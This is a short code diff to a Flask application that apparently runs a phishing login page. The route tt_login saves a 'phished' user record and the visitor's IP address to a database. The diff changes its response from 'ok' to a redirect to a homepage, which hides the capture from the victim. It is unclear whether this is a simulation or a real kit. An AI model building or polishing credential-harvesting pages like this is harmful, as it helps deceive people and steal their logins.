@@ -1,5 +1,5 @@
 from app import db, app
-from flask import render_template, request, session
+from flask import render_template, request, session, redirect
 
 from app.main.config.models import Phish
 
@@ -16,7 +16,7 @@ def tt_login():
                              ip=request.remote_addr)
         db.session.add(user_phished)
         db.session.commit()
-        return 'ok'
+        return redirect('/homepage')
     '''
         platform = db.Column(db.String)
     phised_user = db.Column(db.String)
